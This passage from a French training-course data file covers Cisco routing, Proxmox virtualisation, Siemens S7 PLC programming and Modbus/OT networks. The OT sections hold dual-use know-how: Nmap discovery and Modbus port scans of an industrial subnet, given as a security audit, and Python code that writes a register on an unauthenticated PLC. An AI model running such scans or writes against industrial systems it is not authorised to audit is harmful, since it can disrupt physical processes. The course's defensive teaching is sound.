Router(config-router)# router-id 1.1.1.1
Router(config-router)# network 192.168.1.0 0.0.0.255 area 0
Router(config-router)# network 10.0.0.0 0.0.0.3 area 0
Router(config-router)# passive-interface GigabitEthernet0/0  ! LAN côté clients

! Vérifications
Router# show ip ospf neighbor          ! voisins OSPF
Router# show ip ospf database          ! LSDB complète
Router# show ip route ospf             ! routes apprises via OSPF
Router# debug ip ospf events           ! débogage des événements OSPF

! Ajuster le coût sur une interface
Router(config-if)# ip ospf cost 10`,
        },
        tip: "Pour qu'une adjacence OSPF s'établisse, les deux routeurs doivent avoir le même area ID, le même hello/dead interval et la même authentification. Vérifiez 'show ip ospf neighbor' en cas de problème.",
      },
      {
        title: "5. Sécurité réseau (ACL, port-security)",
        content: `**ACL (Access Control Lists)** : filtrent le trafic réseau sur les interfaces des routeurs. Deux types :\n- **Standard** (1-99, 1300-1999) : filtre sur l'IP source uniquement. À placer au plus près de la destination.\n- **Étendue** (100-199, 2000-2699) : filtre sur IP source/destination + protocole + port. À placer au plus près de la source.\n\n**Port-Security** (switches) : limite le nombre de MAC addresses autorisées sur un port. Protège contre les attaques MAC flooding et les connexions non autorisées.`,
        code: {
          lang: "text",
          code: `! ACL étendue — bloquer HTTP/HTTPS depuis VLAN 30 vers Internet
Router(config)# ip access-list extended BLOC-VLAN30-WEB
Router(config-ext-nacl)# deny tcp 192.168.30.0 0.0.0.255 any eq 80
Router(config-ext-nacl)# deny tcp 192.168.30.0 0.0.0.255 any eq 443
Router(config-ext-nacl)# permit ip any any  ! autoriser le reste
Router(config)# interface GigabitEthernet0/1
Router(config-if)# ip access-group BLOC-VLAN30-WEB in

! Port-Security sur switch
Switch(config)# interface FastEthernet0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 2         ! max 2 MAC
Switch(config-if)# switchport port-security mac-address sticky ! apprendre auto
Switch(config-if)# switchport port-security violation restrict  ! alerter sans bloquer
Switch# show port-security interface FastEthernet0/1`,
        },
      },
      {
        title: "6. TP — Maquette réseau complète Cisco",
        content: `Ce TP vous demande de concevoir et configurer une infrastructure réseau complète d'entreprise sur Cisco Packet Tracer ou GNS3.\n\n**Topologie à réaliser** :\n- 1 routeur ISR (connexion WAN simulée)\n- 2 switches (distribution + accès)\n- 4 VLANs : Direction (10), Production (20), WiFi-Invités (30), Management (99)\n- Adressage VLSM sur 192.168.0.0/24\n- OSPF sur le lien WAN\n- ACL : interdire VLAN Invités d'accéder aux VLANs internes\n- Port-security sur les ports des utilisateurs finaux\n\n**Critères de validation** :\n- Ping entre tous les VLANs autorisés\n- OSPF voisinage établi\n- ACL bloquant le VLAN Invités vers les autres VLANs\n- Port-security actif`,
        tip: "Cisco Packet Tracer est gratuit pour les étudiants (inscription sur netacad.com). GNS3 permet d'utiliser de vraies images IOS mais est plus complexe à configurer.",
      },
      {
        title: "7. QCM de validation",
        content: `Testez vos connaissances sur l'ensemble du cours Réseaux TCP/IP & VLANs. Le QCM couvre : modèle OSI, IPv4, VLSM, VLANs 802.1Q, OSPF, ACL, port-security.\n\n**10 questions — durée estimée : 15 minutes**\n\nUn score de 70% minimum est requis pour valider le module et débloquer le badge TSSR-Réseaux.`,
      },
    ],
  },

  "virtualisation-proxmox-vmware": {
    slug: "virtualisation-proxmox-vmware",
    intro: "La virtualisation est au cœur des infrastructures modernes. Elle permet d'optimiser les ressources hardware, d'isoler les services et de déployer rapidement de nouveaux environnements. Ce cours couvre Proxmox VE (open-source) et les bases de VMware vSphere, ainsi que la haute disponibilité et la sauvegarde des VMs.",
    sections: [
      {
        title: "1. Concepts de virtualisation",
        content: `La virtualisation permet de faire tourner plusieurs systèmes d'exploitation (guests) sur un seul serveur physique (host) grâce à un **hyperviseur**.\n\n**Hyperviseur de type 1** (bare-metal) : s'installe directement sur le hardware, pas de système hôte intermédiaire. Plus performant. Ex: **Proxmox VE**, VMware ESXi, Hyper-V, Xen.\n\n**Hyperviseur de type 2** (hosted) : s'installe comme une application sur un OS existant. Ex: VirtualBox, VMware Workstation, Parallels.\n\n**Conteneurs LXC/Docker** : virtualisation au niveau OS, partage le noyau du host. Beaucoup plus léger qu'une VM complète mais isolation moindre.`,
        tip: "En production, utilisez TOUJOURS un hyperviseur de type 1. Les hyperviseurs de type 2 sont réservés au lab et au développement.",
      },
      {
        title: "2. Proxmox VE — Installation et configuration",
        content: `**Proxmox VE** est une plateforme de virtualisation open-source basée sur Debian + KVM + LXC. Elle offre une interface web complète, la gestion des clusters, la haute disponibilité et les sauvegardes intégrées.\n\n**Stockages supportés** : local (ext4/ZFS), NFS, Ceph, iSCSI, LVM, GlusterFS.\n\n**Réseau** : Proxmox crée des bridges Linux (vmbr0, vmbr1...) auxquels les VMs se connectent. Vous pouvez configurer du bonding, des VLANs, des bridges séparés par zone de sécurité.`,
        code: {
          lang: "bash",
          code: `# Après installation Proxmox — configuration réseau (/etc/network/interfaces)
auto lo
iface lo inet loopback

auto eno1
iface eno1 inet manual

# Bridge principal (accès management et VMs)
auto vmbr0
iface vmbr0 inet static
    address 192.168.1.5/24
    gateway 192.168.1.1
    dns-nameservers 192.168.1.10
    bridge-ports eno1
    bridge-stp off
    bridge-fd 0

# Bridge isolé pour VMs (aucun accès physique)
auto vmbr1
iface vmbr1 inet manual
    bridge-ports none
    bridge-stp off
    bridge-fd 0`,
        },
      },
      {
        title: "3. Haute disponibilité (HA) avec Proxmox Cluster",
        content: `Un cluster Proxmox permet de regrouper plusieurs nœuds Proxmox pour la haute disponibilité et la migration à chaud des VMs.\n\n**Prérequis HA** :\n- Minimum 3 nœuds (quorum : majorité de nœuds actifs)\n- Stockage partagé (Ceph, NFS, iSCSI) pour que les VMs soient accessibles depuis tous les nœuds\n- Réseau dédié pour la réplication (recommandé : 10 GbE)\n\n**Fonctionnement** : si un nœud tombe, le manager HA redémarre automatiquement les VMs configurées en HA sur les nœuds disponibles en moins de 60 secondes.`,
        code: {
          lang: "bash",
          code: `# Créer un cluster (sur le premier nœud)
pvecm create MON-CLUSTER

# Rejoindre le cluster (sur les autres nœuds)
pvecm add 192.168.1.5  # IP du premier nœud

# Vérifier l'état du cluster
pvecm status
pvecm nodes

# Configurer HA pour une VM (ID 100)
ha-manager add vm:100 --state started --group ha-group-1

# Voir l'état HA
ha-manager status`,
        },
        tip: "Testez votre HA régulièrement ! Simulez la panne d'un nœud (shutdown brutal) en environnement de test pour valider que les VMs redémarrent correctement.",
      },
      {
        title: "4. Sauvegarde et restauration (PBS)",
        content: `**Proxmox Backup Server (PBS)** est la solution de sauvegarde dédiée à Proxmox VE. Il offre la **déduplication**, le **chiffrement** et les sauvegardes **incrémentales** (seules les données modifiées sont transférées).\n\n**Avantages PBS** :\n- Déduplication : réduction drastique de l'espace (souvent 5:1 ou plus)\n- Chiffrement AES-256 côté client (les données arrivent déjà chiffrées sur PBS)\n- Restauration granulaire de fichiers sans restaurer la VM entière\n- Vérification automatique de l'intégrité\n\n**Stratégie recommandée** : PBS sur un serveur séparé du cluster Proxmox + copie vers un stockage externe (règle 3-2-1).`,
        code: {
          lang: "bash",
          code: `# Configuration PBS dans l'interface Proxmox VE
# Datacenter → Storage → Add → Proxmox Backup Server
# Host: 192.168.1.30, Datastore: sauvegardes

# Sauvegarde manuelle d'une VM depuis CLI
vzdump 100 --storage pbs-store --mode snapshot --compress zstd

# Planifier les sauvegardes (Datacenter → Backup → Add)
# Toutes les nuits à 2h, rétention : 7 daily, 4 weekly, 3 monthly

# Vérifier les backups disponibles
proxmox-backup-client list

# Restaurer un fichier spécifique depuis PBS (sans restaurer toute la VM)
proxmox-backup-client restore vm/100/2024-01-15T02:00:00Z /etc/nginx/nginx.conf ./nginx.conf.restored

# Restaurer une VM complète
qmrestore pbs:backup-dir/vzdump-qemu-100-2024_01_15.vma.zst 100 --force`,
        },
        tip: "Ne stockez jamais vos sauvegardes sur le même stockage que vos VMs. Une panne du stockage principal détruirait à la fois la VM et sa sauvegarde.",
      },
      {
        title: "5. Conteneurs LXC",
        content: `Les **conteneurs LXC** (Linux Containers) sont une forme légère de virtualisation qui partage le noyau du système hôte. Ils démarrent en quelques secondes et consomment bien moins de ressources qu'une VM complète.\n\n**VM vs Conteneur LXC** :\n- VM : noyau indépendant, isolation complète, surcoût important (~512 Mo RAM minimum)\n- LXC : partage le noyau Proxmox, démarrage en 2-3s, ~32 Mo RAM pour un serveur web\n\n**Cas d'usage LXC** : serveurs web légers, bases de données, services DNS/DHCP, reverse proxy, containers de développement.\n\n**Limitation LXC** : partage du noyau = impossible de faire tourner Windows ou un noyau différent.`,
        code: {
          lang: "bash",
          code: `# Créer un conteneur LXC Debian depuis CLI Proxmox
pct create 200 \
  local:vztmpl/debian-12-standard_12.2-1_amd64.tar.zst \
  --hostname web-server \
  --memory 512 \
  --cores 2 \
  --rootfs local-lvm:8 \
  --net0 name=eth0,bridge=vmbr0,ip=192.168.1.200/24,gw=192.168.1.1 \
  --password $(openssl rand -base64 12) \
  --start 1

# Entrer dans le conteneur
pct enter 200

# Opérations courantes
pct list                    # lister tous les LXC
pct start 200               # démarrer
pct stop 200                # arrêter
pct shutdown 200            # arrêt propre
pct snapshot 200 snap1      # snapshot
pct restore 200 snap1       # restaurer snapshot

# Convertir un LXC en template réutilisable
pct template 200            # transforme le LXC en template`,
        },
      },
      {
        title: "6. TP — Infrastructure virtualisée complète",
        content: `TP final : déployer une infrastructure virtualisée complète sur Proxmox VE avec haute disponibilité.\n\n**Scénario** : vous êtes l'administrateur infrastructure de "TechFormation SAS". Vous devez virtualiser l'ensemble des serveurs sur 2 nœuds Proxmox.\n\n**Infrastructure à déployer** :\n1. Installer Proxmox VE sur 2 serveurs (ou VMs imbriquées)\n2. Créer un cluster 2 nœuds avec stockage NFS partagé\n3. Déployer 3 VMs : SRV-WEB (Debian + Nginx), SRV-DB (Debian + MariaDB), SRV-DNS (Debian + Bind9)\n4. Déployer 2 LXC : Monitoring (Netdata), Reverse Proxy (Nginx)\n5. Configurer PBS pour les sauvegardes nocturnes avec rétention 7/4/3\n6. Activer HA sur la VM SRV-WEB\n7. Tester : couper le nœud 1 et vérifier que SRV-WEB migre automatiquement`,
        tip: "Vous pouvez installer Proxmox dans VirtualBox/VMware Workstation (nested virtualization) pour ce TP. Activez VT-x/AMD-V dans les paramètres de la VM hôte.",
      },
      {
        title: "7. QCM de validation",
        content: `Testez vos connaissances sur l'ensemble du cours Virtualisation Proxmox & VMware. Le QCM couvre : hyperviseurs, Proxmox VE, clusters HA, PBS, conteneurs LXC.\n\n**10 questions — durée estimée : 15 minutes**\n\nUn score de 70% minimum est requis pour valider le module et débloquer le badge TAI-Virtualisation.`,
      },
    ],
  },

  "automates-programmables-siemens": {
    slug: "automates-programmables-siemens",
    intro: "Les automates programmables industriels (API/PLC) sont les ordinateurs de l'industrie. Ils pilotent les machines, les lignes de production et les processus industriels. Ce cours vous forme à la programmation des automates Siemens S7-1200/1500 avec TIA Portal, le logiciel de développement de référence.",
    sections: [
      {
        title: "1. Architecture d'un automate Siemens S7",
        content: `Un automate Siemens S7 se compose de plusieurs modules :\n\n**CPU** : unité centrale avec mémoire programme et données. Le S7-1200 est destiné aux petites/moyennes machines, le S7-1500 aux grandes installations.\n\n**Modules d'entrées/sorties (E/S)** :\n- **Entrées TOR** (Tout Ou Rien) : capteurs, boutons, fins de course\n- **Sorties TOR** : actionneurs, voyants, relais\n- **Entrées/sorties analogiques** : capteurs 4-20mA, 0-10V (température, pression, débit)\n\n**Mémoire** : mémoire programme (Programme Blocks), mémoire données (Data Blocks), mémoire E/S (Process Image).\n\n**Cycle d'exécution** : Lecture entrées → Exécution programme → Écriture sorties → Communications (répété toutes les 1 à 100ms)`,
        tip: "Le temps de cycle est critique en industrie. Un API trop chargé peut avoir des temps de cycle dépassant les tolérances du procédé. Surveillez toujours le %CPU dans TIA Portal > Diagnostics.",
      },
      {
        title: "2. Programmation Ladder (LD)",
        content: `Le **Ladder Diagram** (Schéma à contacts) est le langage PLC le plus utilisé dans l'industrie. Il représente graphiquement les circuits électriques de relais. Chaque rung (barreau) est une équation logique.\n\n**Symboles de base** :\n- **Contact NO** (normalement ouvert) : --|  |-- → passant si le bit est TRUE\n- **Contact NC** (normalement fermé) : --|/|-- → passant si le bit est FALSE  \n- **Bobine** : --( )-- → met le bit à TRUE si la logique est vraie\n- **Bobine SET** : --(S)-- → force à TRUE et maintient\n- **Bobine RESET** : --(R)-- → force à FALSE\n\n**Blocs fonctionnels** : TON (temporisateur à l'enclenchement), TOF (déclenchement), CTU (compteur), MOVE, ADD, COMPARE...`,
        code: {
          lang: "text",
          code: `// Exemple Ladder — Commande démarrage moteur avec protection thermique
// Réseau 1 : Démarrage moteur
// ------[BP_START]----[/THERMIQUE]----[/BP_STOP]----(MOTEUR_MARCHE)
//         ||
//       [MOTEUR_MARCHE]  ← Contact de maintien (auto-alimentation)

// Réseau 2 : Temporisateur de démarrage progressif (3 secondes)
// ------[MOTEUR_MARCHE]----[TON T#3s]----( VITESSE_PLEINE)
//                              ▼
//                           Q: sortie après 3s

// Variables utilisées :
// I0.0 = BP_START (bouton poussoir marche)
// I0.1 = BP_STOP  (bouton poussoir arrêt, NC câblé en NO ici)
// I0.2 = THERMIQUE (contact thermique moteur, NC)
// Q0.0 = MOTEUR_MARCHE (contacteur moteur)
// Q0.1 = VITESSE_PLEINE (variateur de fréquence)`,
        },
      },
      {
        title: "3. Blocs de données (DB) et structuration",
        content: `TIA Portal organise le programme en **blocs** :\n\n**OB (Organization Block)** : blocs d'organisation appelés automatiquement par le système. OB1 = programme principal (cyclique), OB30 = interruption cyclique, OB82 = alarme de diagnostic.\n\n**FB (Function Block)** : fonction avec mémoire persistante (instance DB). Idéal pour les équipements répétitifs (3 pompes identiques = 3 instances d'un même FB).\n\n**FC (Function)** : fonction sans mémoire. Calculs, conversions.\n\n**DB (Data Block)** : zone de données. Global DB (partagé) ou Instance DB (lié à un FB).`,
        code: {
          lang: "text",
          code: `// Exemple SCL — Régulation PID manuelle (FB simplifié)
FUNCTION_BLOCK FB_Regulation
VAR_INPUT
    Consigne     : REAL;   // Valeur désirée
    Mesure       : REAL;   // Valeur mesurée
    Kp           : REAL := 1.5;  // Gain proportionnel
    Ki           : REAL := 0.1;  // Gain intégral
END_VAR

VAR_OUTPUT
    Commande     : REAL;   // Sortie vers actionneur (0.0 à 100.0%)
END_VAR

VAR
    Erreur       : REAL;
    Integrale    : REAL;
END_VAR

BEGIN
    Erreur    := Consigne - Mesure;
    Integrale := Integrale + (Erreur * Ki * 0.1);  // 0.1 = temps cycle 100ms
    Commande  := LIMIT(0.0, (Kp * Erreur) + Integrale, 100.0);
END_FUNCTION_BLOCK`,
        },
        tip: "En SCL, pensez toujours à initialiser vos variables. Une variable REAL non initialisée peut contenir une valeur aléatoire et provoquer un comportement imprévisible de la machine.",
      },
      {
        title: "4. Communication et réseaux automates",
        content: `Les automates modernes communiquent entre eux et avec les superviseurs via des réseaux industriels standardisés.\n\n**Protocoles Siemens** :\n- **MPI** (Multi Point Interface) : protocole propriétaire Siemens, local (jusqu'à 32 nœuds), limité à 12 Mbps. En voie de disparition.\n- **Profibus DP** : bus série RS-485, jusqu'à 12 Mbps, 127 esclaves. Standard en automation depuis 30 ans.\n- **Profinet** : Ethernet industriel, 100 Mbps/1 Gbps, temps réel configurable. Standard actuel sur les nouvelles installations.\n- **S7 Communication (PUT/GET)** : communication entre automates Siemens via Ethernet.\n\n**OPC-UA** : standard ouvert d'interopérabilité, intégré nativement dans les S7-1500.`,
        code: {
          lang: "text",
          code: `// Configuration PUT/GET entre deux S7-1200 (TIA Portal)
// Sur l'API émetteur — appel du bloc TPUT (envoi)

// Réseau → Propriétés → Autoriser l'accès PUT/GET depuis un partenaire distant

// Bloc TPUT dans le programme (OB1) :
// Instance DB : DB_Communication_Send
// ID          : 16#0001 (connexion préalablement configurée)
// REQ         : front montant → déclenchement envoi
// ADDR        : P#DB10.DBX0.0 BYTE 10 (adresse cible sur l'API distant)
// SD_1        : P#DB5.DBX0.0 BYTE 10  (données à envoyer)

// Vérification
// CPU → Diagnostics → Connexions → état de la connexion S7`,
        },
      },
      {
        title: "5. Diagnostic et dépannage TIA Portal",
        content: `Le diagnostic TIA Portal permet d'identifier rapidement les problèmes sur l'automate et les équipements PROFINET sans démonter l'installation.\n\n**Outils de diagnostic** :\n- **LED CPU** : RUN (vert), STOP (jaune), ERROR (rouge clignotant), MAINT (jaune clignotant)\n- **Buffer de diagnostic** : liste chronologique des événements système (démarrages, erreurs, alarmes)\n- **Watch Table** : surveillance en temps réel des variables du programme\n- **Force Table** : forcer des valeurs pour tester sans modifier le programme\n- **Online Monitor** : visualisation en temps réel du Ladder/SFC avec les états des contacts`,
        code: {
          lang: "text",
          code: `// Procédure de dépannage TIA Portal

// 1. LED rouge clignotante sur CPU
//    → Online → Diagnostics → Buffer de diagnostic
//    Chercher le code d'erreur (ex: 16#4500 = erreur périphérique)

// 2. Watch Table — surveiller des variables en temps réel
//    Monitor/Modify → New Watch Table
//    Ajouter : %IW0 (entrée analogique), %QB0 (sortie octet), "DB_Moteur".Vitesse

// 3. Force Table — forcer une sortie pour test
//    ⚠️ ATTENTION : forcer une sortie en production peut déclencher une machine
//    Forcer %Q0.0 à TRUE → démarrage du moteur

// 4. Cross Reference — trouver où est utilisée une variable
//    Outils → Références croisées → chercher "Capteur_Temperature"

// 5. Simulation PLCSIM (sans matériel physique)
//    Démarrer → Simulation → Télécharger → Exécuter`,
        },
        tip: "Avant toute intervention sur un automate en production, passez en STOP, consignez l'énergie (LOTO - Lockout/Tagout) et informez le chef de production. Ne jamais forcer des sorties sur une machine en fonctionnement.",
      },
      {
        title: "6. TP — Programme complet sur S7-1200",
        content: `TP final : programmer un système de contrôle complet sur S7-1200 dans TIA Portal.\n\n**Scénario** : contrôle d'un système de remplissage de réservoirs pour une station de traitement d'eau.\n\n**Cahier des charges** :\n- 2 pompes (P1 pompe d'aspiration, P2 pompe de refoulement)\n- 3 capteurs de niveau (bas, moyen, haut) — entrées TOR\n- 1 capteur de pression analogique (4-20mA → 0-10 bars)\n- Séquence automatique : P1 démarre si niveau bas → P2 démarre si niveau moyen → arrêt si niveau haut\n- Alarme si pression > 8 bars pendant plus de 5 secondes\n- Mode manuel : forçage individuel des pompes via IHM\n- Compteur de cycles avec remise à zéro\n\n**Blocs à créer** : OB1 (principal), FB_Pompe (avec instance DB), FC_Alarme, DB_Compteurs.`,
        tip: "Commencez toujours par le GRAFCET (SFC) sur papier avant de coder. Un programme bien conçu sur papier se code en 2x moins de temps et contient 5x moins de bugs.",
      },
      {
        title: "7. QCM de validation",
        content: `Testez vos connaissances sur l'ensemble du cours Automates Programmables Siemens. Le QCM couvre : architecture S7, Ladder, blocs (OB/FB/FC/DB), communication PROFINET, diagnostic TIA Portal.\n\n**10 questions — durée estimée : 15 minutes**\n\nUn score de 70% minimum est requis pour valider le module et débloquer le badge TAI-Automates.`,
      },
    ],
  },

  "reseaux-industriels-modbus": {
    slug: "reseaux-industriels-modbus",
    intro: "Les réseaux industriels (OT — Operational Technology) connectent les automates, capteurs, actionneurs et superviseurs d'une installation industrielle. Contrairement aux réseaux IT, la priorité est la disponibilité et le temps réel. Ce cours couvre Modbus, Profibus, Profinet et la sécurité des réseaux OT.",
    sections: [
      {
        title: "1. Protocole Modbus",
        content: `**Modbus** est le protocole industriel le plus ancien (1979, Modicon) et encore le plus répandu. Sa simplicité et son interopérabilité en font un standard de facto.\n\n**Variantes** :\n- **Modbus RTU** : communication série (RS-232/RS-485), trames binaires compactes. Un maître, jusqu'à 247 esclaves.\n- **Modbus TCP** : encapsulation dans TCP/IP (port 502). Permet l'intégration dans les réseaux Ethernet.\n- **Modbus ASCII** : rare, caractères ASCII, moins efficace.\n\n**Modèle de données** — 4 types de registres :\n- **Coils** (0x) : sorties TOR lecture/écriture\n- **Discrete Inputs** (1x) : entrées TOR lecture seule\n- **Input Registers** (3x) : registres 16 bits lecture seule\n- **Holding Registers** (4x) : registres 16 bits lecture/écriture`,
        code: {
          lang: "python",
          code: `# Lecture Modbus TCP avec Python (bibliothèque pymodbus)
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Lire 10 Holding Registers depuis l'adresse 0 (esclave ID=1)
result = client.read_holding_registers(address=0, count=10, slave=1)

if not result.isError():
    for i, val in enumerate(result.registers):
        print(f"Registre {i}: {val} (hex: {val:#06x})")
else:
    print(f"Erreur Modbus: {result}")

# Écrire dans un registre (commande vers automate)
client.write_register(address=10, value=1500, slave=1)  # consigne = 1500

client.close()`,
        },
        tip: "Modbus n'a aucune authentification ni chiffrement. En environnement industriel, isolez absolument les réseaux OT des réseaux IT avec un firewall industriel (Stormshield, Fortinet OT).",
      },
      {
        title: "2. Profibus et Profinet",
        content: `**PROFIBUS** (Process Field Bus) : bus de terrain sériel très répandu en Europe, notamment dans l'automobile et la chimie. PROFIBUS DP (Decentralized Periphery) est la variante standard pour l'automatisme.\n\n**PROFINET** : successeur Ethernet de Profibus. Tourne sur infrastructure Ethernet standard 100/1000 Mbps mais avec des mécanismes temps-réel :\n- **PROFINET IO RT** (Real-Time) : cycles 4-512ms, suffisant pour la plupart des applications\n- **PROFINET IO IRT** (Isochronous Real-Time) : cycles <1ms, pour les axes servo et robotique\n\n**Avantages PROFINET** : même câblage que le réseau IT, diagnostic avancé, intégration Web, temps de cycle configurable.`,
        code: {
          lang: "text",
          code: `// Configuration PROFINET dans TIA Portal (résumé)

// 1. Réseau projet → Ajouter équipement PROFINET
//    → Importer fichier GSDML du fabricant (capteur, variateur...)

// 2. Assigner l'adresse IP et le nom PROFINET au périphérique
//    Device Name: "capteur-temperature-zone1"
//    IP Address : 192.168.0.101
//    Subnet     : 255.255.255.0
//    Gateway    : 192.168.0.1

// 3. Mapper les modules E/S dans le rack virtuel TIA

// 4. Adresses dans le programme :
//    %IW64  = Valeur analogique entrée (mot d'entrée 64)
//    %QW32  = Consigne vers variateur (mot de sortie 32)

// Diagnostic depuis le programme
// SFB52 "RDREC" → lire un enregistrement de diagnostic
// SFB53 "WRREC" → écrire un paramètre dans l'équipement`,
        },
      },
      {
        title: "3. Sécurité des réseaux OT/ICS",
        content: `Les systèmes industriels (ICS/SCADA) sont des cibles croissantes pour les cyberattaques (Stuxnet, TRITON, Colonial Pipeline). La convergence IT/OT multiplie les vecteurs d'attaque.\n\n**Principes de sécurité OT (ANSSI)** :\n\n1. **Segmentation réseau** : zone IT ↔ DMZ industrielle ↔ zone OT. Firewall industriel entre chaque zone. Jamais de connexion directe IT-OT.\n\n2. **Gestion des accès** : supprimer les comptes par défaut, MFA pour l'accès distant, journalisation de toutes les connexions.\n\n3. **Mises à jour** : processus de patch management adapté à la contrainte de disponibilité industrielle (fenêtres de maintenance planifiées).\n\n4. **Supervision de sécurité** : sondes industrielles passives (Claroty, Nozomi, Dragos) pour détecter les anomalies sans perturber le process.`,
        tip: "Le guide ANSSI 'Maîtriser la SSI pour les systèmes industriels' (disponible sur ssi.gouv.fr) est la référence française. La norme IEC 62443 est le standard international de cybersécurité industrielle.",
      },
      {
        title: "4. SCADA et supervision WinCC",
        content: `**SCADA** (Supervisory Control And Data Acquisition) est le niveau supérieur de la pyramide d'automatisation. Il assure la **supervision**, le **contrôle à distance** et la **collecte de données** historiques de l'ensemble d'une installation industrielle.\n\n**WinCC** (Windows Control Center) est le logiciel SCADA de Siemens, intégré dans TIA Portal (WinCC Basic/Comfort/Advanced) ou autonome (WinCC Professional/SCADA).\n\n**Fonctions SCADA** :\n- **Synoptiques** : représentation graphique animée du procédé (mimic)\n- **Alarmes** : gestion, acquittement, historisation\n- **Tendances** : courbes d'évolution des variables dans le temps\n- **Rapports** : rapports de production automatiques\n- **Gestion des recettes** : paramètres de production par produit`,
        code: {
          lang: "text",
          code: `// Architecture SCADA WinCC — composants
//
// Niveau 4 : ERP / MES (SAP, Manufacturing Execution System)
//                    ↕ OPC-UA / REST API
// Niveau 3 : SCADA WinCC (supervision globale, historique)
//                    ↕ OPC-UA / S7 Communication
// Niveau 2 : API S7-1500 (contrôle de zone)
//                    ↕ PROFINET / PROFIBUS
// Niveau 1 : Équipements terrain (capteurs, variateurs, IHM)
//
// Tags WinCC — correspondance avec les variables TIA Portal :
// Tag : "Temperature_Zone1"
// Type : Real
// Connexion : SPS_1 (S7-1500)
// Adresse API : DB10.DBD0  (flottant 32 bits dans DB10)
//
// Script WinCC (VBScript) — alarme si température > seuil
// Function CheckTemperature()
//   If HMIRuntime.Tags("Temperature_Zone1").Read > 85 Then
//     HMIRuntime.Trace "Alarme température dépassée !"
//   End If
// End Function`,
        },
      },
      {
        title: "5. Cybersécurité OT pratique",
        content: `La cybersécurité des systèmes industriels OT nécessite une approche différente de l'IT classique : la **disponibilité** prime sur la confidentialité, les systèmes ont souvent des durées de vie de 20-30 ans, et certains ne peuvent pas être mis à jour sans arrêt de production.\n\n**10 mesures prioritaires ANSSI pour l'OT** :\n1. Inventaire précis de tous les actifs OT\n2. Segmentation réseau IT/OT avec firewall industriel\n3. Durcissement des postes d'ingénierie (TIA Portal, etc.)\n4. Gestion des accès distants (VPN dédié avec MFA)\n5. Sauvegarde des programmes automates et configurations\n6. Désactivation des protocoles non sécurisés (FTP, Telnet)\n7. Surveillance passive du réseau OT (sondes non-intrusives)\n8. Plan de réponse à incident adapté à l'OT\n9. Formation du personnel aux risques cyber\n10. Tests de sécurité réguliers (audit de configuration)`,
        code: {
          lang: "bash",
          code: `# Audit de sécurité réseau OT — éléments à vérifier

# 1. Scan passif avec Nmap (jamais de scan agressif sur OT !)
nmap -sn 192.168.100.0/24 -oA inventaire-ot   # discovery ping uniquement
nmap -sV --version-intensity 0 192.168.100.0/24  # bannières uniquement

# 2. Chercher les services Modbus exposés (port 502)
nmap -p 502 192.168.100.0/24 --open

# 3. Vérifier les comptes par défaut Siemens (common defaults)
# TIA Portal → CPU → Protection → Niveau d'accès
# Vérifier que le niveau "Accès complet" nécessite un mot de passe

# 4. Audit des connexions actives (depuis workstation OT)
netstat -an | findstr "502\|102\|4840"   # Modbus, S7, OPC-UA
# Port 102 (S7comm) ouvert sur Internet = incident de sécurité critique

# 5. Politique de mots de passe TIA Portal
# Paramètres CPU → Protection → définir MDP pour chaque niveau d'accès`,
        },
        tip: "Ne jamais lancer de scans Nmap agressifs (-A, -sS, --script) sur des réseaux OT en production. Les automates et équipements terrain peuvent se bloquer ou redémarrer sous charge réseau anormale.",
      },
      {
        title: "6. TP — Intégration réseau industriel complet",
        content: `TP final : intégrer une chaîne complète de communication industrielle, de l'automate jusqu'à la supervision SCADA.\n\n**Architecture du TP** :\n- 1 S7-1200 simulé dans PLCSIM Advanced (ou physique)\n- Communication PROFINET avec un variateur de fréquence simulé\n- Supervision WinCC Basic intégrée à TIA Portal\n- Communication Modbus TCP vers un système tiers (simulé avec un script Python)\n\n**Étapes** :\n1. Configurer le réseau PROFINET entre CPU et périphérie déportée\n2. Programmer la lecture d'un capteur de température (registre Modbus 3x0001)\n3. Créer un synoptique WinCC avec : valeur de température, courbe tendance, alarme si T > 80°C\n4. Tester le déclenchement d'alarme et son acquittement\n5. Exporter un rapport de production sur 1h simulée\n\n**Livrable** : documentation de configuration + captures du synoptique opérationnel.`,
        tip: "PLCSIM Advanced (Siemens) permet de simuler un S7-1200/1500 complet incluant les communications PROFINET et OPC-UA, sans matériel physique. Il est inclus dans le TIA Portal Evaluation.",
      },
      {
        title: "7. QCM de validation",
        content: `Testez vos connaissances sur l'ensemble du cours Réseaux Industriels & Modbus. Le QCM couvre : Modbus RTU/TCP, Profibus, Profinet, SCADA WinCC, cybersécurité OT, IEC 62443.\n\n**10 questions — durée estimée : 15 minutes**\n\nUn score de 70% minimum est requis pour valider le module et débloquer le badge TAI-RéseauxIndustriels.`,
      },
    ],
  },
};
